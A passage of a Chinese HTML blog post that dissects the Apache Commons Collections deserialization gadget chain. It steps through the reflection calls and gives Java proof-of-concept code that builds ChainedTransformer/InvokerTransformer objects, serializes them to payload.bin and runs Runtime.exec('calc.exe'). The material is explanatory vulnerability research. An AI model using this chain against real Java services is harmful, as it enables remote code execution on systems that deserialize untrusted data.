<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><p><img src="https://www.hualigs.cn/image/608bc02ed0544.jpg"></p><p><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#setValue</code></p><p>首先进入<code>setValue</code>，调用了<code>checkSetValue</code></p><p><img src="https://www.hualigs.cn/image/608bc02f567b5.jpg"></p><p><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p><p><code>this.valueTransformer</code>等于<code>ChainedTransformer</code>类，调用了<code>ChainedTransformer</code>类中的<code>transform</code>方法</p><p><img src="https://www.hualigs.cn/image/608bc02f6263e.jpg"></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p><p><img src="https://www.hualigs.cn/image/608bc02f6f7cb.jpg"></p><p>根据<code>this.iTransformers</code>数组的值可以知道，第一次进入的是<code>ConstantTransformer</code>类的<code>transform</code>方法，后三次进入的是<code>InvokerTransformer</code>类的<code>transform</code>。<code>transform</code>的返回值会作为下个<code>transform</code>函数的参数，</p><p><img src="https://www.hualigs.cn/image/608bc030336bd.jpg"></p><p>看一下<code>ChainedTransformer</code>的构造函数，可以发现<code>this.iTransformers</code>可控</p><p><img src="https://www.hualigs.cn/image/608bc03236f07.jpg"></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer</code></p><p>第一次进入的<code>transform</code></p><p><img src="https://www.hualigs.cn/image/608bc0300ee48.jpg"></p><p><code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p><p>后三次进入<code>InvokerTransformer</code>的<code>Transformer</code>方法，这里存在反射调用，参数可控。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setValue()-&gt;</span><br><span class="line">checkSetvalue()-&gt;</span><br><span class="line">&#96;ChainedTransformer&#96;类中的&#96;transform&#96;方法-&gt;</span><br><span class="line">四次循环，第一次进入ConstantTransformer的transform，后三次进入InvokerTransformer的transform-&gt;</span><br><span class="line">触发反射</span><br></pre></td></tr></table></figure><h1 id="反射链"><a href="#反射链" class="headerlink" title="反射链"></a>反射链</h1><p><code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p><p>这里实现了反射调用，如果<code>input</code>等于<code>Runtime类</code>，那么<code>input.getClass</code>获取到的是<code>java.lang.class</code>，无法获取到方法，必须让<code>input</code>等于<code>Runtime实例</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//input必须为Runtime的实例，cls才会等于Runtime类，</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//this.iMethodName等于exec，this.iParamTypes等于String.class</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="comment">//this.Args为要执行的命令</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); </span><br><span class="line">            &#125; </span><br><span class="line">           .........</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下构造函数，三个属性都是传入参数</p><p><img src="https://www.hualigs.cn/image/608bc02f7cc33.jpg"></p><p>参考反射命令执行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">                .getMethod(<span class="string">&quot;exec&quot;</span>, String.class)</span><br><span class="line">                .invoke(                        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br><span class="line">                        ,</span><br><span class="line">                        <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line">                );</span><br></pre></td></tr></table></figure><p>需要满足以下条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.iMethodName=“exec”</span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line">input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure><p>尝试尝试构造执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608bc034d2af5.jpg"></p><p>可以成功执行，但是还存在一个问题就是无法传入<code>Runtime</code>的实例对象。</p><h2 id="两种获取Runtime实例的错误思路"><a href="#两种获取Runtime实例的错误思路" class="headerlink" title="两种获取Runtime实例的错误思路"></a>两种获取Runtime实例的错误思路</h2><p>用readObject模拟反序列化</p><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造InvokerTransformer</span></span><br><span class="line">        InvokerTransformer a=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        FileOutputStream f=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout=<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造传入transform的参数，Runtime实例</span></span><br><span class="line">        Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fi=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin=<span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        InvokerTransformer b=(InvokerTransformer) fin.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞，调用transform，input为传入参数</span></span><br><span class="line">        b.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><p>可以看到存在一个问题，必须给<code>transform</code>传入一个构造好的Runtime实例也就是<code>input</code>才可以触发漏洞，实际环境里不可能有这样一个构造好的实例，那么能否利用反序列化给<code>transform</code>传入Runtime实例呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> <span class="keyword">implements</span> <span class="title">Serializable</span>  </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//构造传入transform的参数，为Runtime实例，</span></span><br><span class="line">        Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fi=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin=<span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        InvokerTransformer b=(InvokerTransformer) fin.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞，调用transform，input为传入参数</span></span><br><span class="line">        b.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608bc03604caa.jpg"></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p><p>这里可以控制传入<code>transform</code>的参数，因为<code>object</code>的来源是上一次<code>this.ITransformers[i].transform</code>的返回值，而且因为<code>iTransformers</code>可控，我们可以调用任意一个类的<code>transform</code>方法</p><p><img src="https://www.hualigs.cn/image/608bc02f6f7cb.jpg"></p><p><code>org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer</code></p><p>这里我们可以控制<code>this.iContant</code>，它会等于下一次执行的传入参数<code>object</code>。表面上看让它等于<code>Runtime实例</code>就解决了之前无法传入<code>Runtime</code>实例的问题，但是实际上并不可行，因为Runtime类不能被反序列化</p><p><img src="https://www.hualigs.cn/image/608bc0300ee48.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造Transformers数组</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用ChainedTransformer封装构造好的Transformers数组，也就是让构造好的数组等于this.iTransformers</span></span><br><span class="line">        Transformer transformerChain=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        FileOutputStream f=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout=<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行失败</p><p><img src="https://www.hualigs.cn/image/608bc036059cd.jpg"></p><p>换一种思路，有没有可能利用反射直接在服务器生成一个Runtime实例？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformers</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然报错，原因是前面提到的反射机制，<code>Runtime.class</code>返回<code>java.lang.class</code>，这里我们必须把<code>Runtime.class</code>换成<code>Runtime实例.class</code>才能按预想中的执行，但是我们现在就在想办法得到<code>Runtime实例</code>，这样就变成一个死循环了。这个方法也不行</p><p><img src="https://www.hualigs.cn/image/608bc0318b74b.jpg"></p><h2 id="反射套娃"><a href="#反射套娃" class="headerlink" title="反射套娃"></a>反射套娃</h2><p><code>getRuntime</code>方法会返回<code>Runtime实例</code>，只要获取到了<code>getRuntime</code>方法再<code>invoke</code>执行就等于获取到了<code>Runtime实例</code>。既然无法直接获取Runtime实例，那可以去尝试获取getRuntime方法。</p><p><strong>注意：开始传入的是java.lang.class类（Runtime.class）</strong></p><p>步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</span><br><span class="line"></span><br><span class="line">2. 通过getMethod函数获取Runtime类中的getRuntime函数。在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</span><br><span class="line"></span><br><span class="line">3. 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</span><br><span class="line"></span><br><span class="line">4. invoke调用getRuntime函数，获取Runtime类的实例。里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</span><br></pre></td></tr></table></figure><p>关于反射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">类.getMethod(要获取的方法名,要获取方法的参数类型) 获得方法对象</span><br><span class="line">方法对象.invoke(相关类实例&#x2F;相关类,参数)  执行方法</span><br><span class="line"></span><br><span class="line">invoke的第一个参数是执行method的对象obj：</span><br><span class="line">        如果这个方法是一个普通方法，那么第一个参数是类对象</span><br><span class="line">        如果这个方法是一个静态方法，那么第一个参数是类</span><br></pre></td></tr></table></figure><p>接下来分析一下利用反射机制进行反射调用的过程</p><p>第一次循环直接返回了<code>Runtime.class</code></p><p><img src="https://www.hualigs.cn/image/608bc0300ee48.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input1&#x3D;Runtime.class</span><br></pre></td></tr></table></figure><p>第二次</p><p>实际执行的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二次循环</span></span><br><span class="line">       Class cls2=input1.getClass(); <span class="comment">//cls2:java.lang.class类</span></span><br><span class="line">       Method method2=cls2.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);<span class="comment">//method2:通过反射获取到的getMethod对象</span></span><br><span class="line">       Object input2=method2.invoke(input1,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125; &#125;);<span class="comment">//input2:getRuntime对象</span></span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608bc0325cf05.jpg"></p><p><img src="https://www.hualigs.cn/image/608bc03229eb1.jpg"></p><p><img src="https://www.hualigs.cn/image/608bc03234de2.jpg"></p><p>第三次循环，最重要的一步，先用反射获取<code>invoke方法对象</code>，然后利用<code>invoke方法对象.invoke</code>执行传入<code>getRuntime</code>方法对象，得到<code>Runtime</code>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三次循环，input是通过反射获取到的getRuntime对象</span></span><br><span class="line">        Class cls3=input2.getClass();<span class="comment">//java.lang.reflec.Method类</span></span><br><span class="line">        Method method3=cls3.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;);<span class="comment">//method3:invoke方法对象.第二个参数为invoke的参数类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)</span></span><br><span class="line">        Object input3=method3.invoke(input2,<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125; &#125;); <span class="comment">//input3:Runtime实例</span></span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608bc03237b59.jpg"></p><p><img src="https://www.hualigs.cn/image/608bc03102586.jpg"></p><p>第四次循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第四次循环，已经获取到了Runtime实例</span></span><br><span class="line">       Class cls4=input3.getClass(); <span class="comment">//cls4:java.lang.Runtime类</span></span><br><span class="line">       Method method4=cls4.getMethod(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123;String.class &#125;);<span class="comment">//method4:exec方法对象</span></span><br><span class="line">       method4.invoke(input3,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);<span class="comment">//exec方法对象.invoke(Runtime实例,参数)</span></span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608bc02f6f7cb.jpg"></p><p><img src="https://www.hualigs.cn/image/608bc0326de94.jpg"></p><p>简化流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次循环,返回了Runtie.class</span></span><br><span class="line">        Class input1=Runtime.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第二次循环</span></span><br><span class="line">        Class cls2=input1.getClass(); <span class="comment">//cls2:java.lang.class类</span></span><br><span class="line">        Method method2=cls2.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);<span class="comment">//method2:通过反射获取到的getMethod对象</span></span><br><span class="line">        Object input2=method2.invoke(input1,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125; &#125;);<span class="comment">//input2:getRuntime对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//第三次循环，input是通过反射获取到的getRuntime对象</span></span><br><span class="line">        Class cls3=input2.getClass();<span class="comment">//java.lang.reflec.Method类</span></span><br><span class="line">        Method method3=cls3.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;);<span class="comment">//method3:invoke方法对象.第二个参数为invoke的参数类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)</span></span><br><span class="line">        Object input3=method3.invoke(input2,<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125; &#125;); <span class="comment">//input3:Runtime实例</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//第四次循环，已经获取到了Runtime实例</span></span><br><span class="line">        Class cls4=input3.getClass(); <span class="comment">//cls4:java.lang.Runtime类</span></span><br><span class="line">        Method method4=cls4.getMethod(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123;String.class &#125;);<span class="comment">//method4:exec方法对象</span></span><br><span class="line">        method4.invoke(input3,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);<span class="comment">//exec方法对象.invoke(Runtime实例,参数)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="反序列化触发点"><a href="#反序列化触发点" class="headerlink" title="反序列化触发点"></a>反序列化触发点</h1><p>到目前为止我们已经构造好了反射利用链，现在来看一下如何触发，触发需要两个条件</p><figure class="highlight plain"><table><tr><td 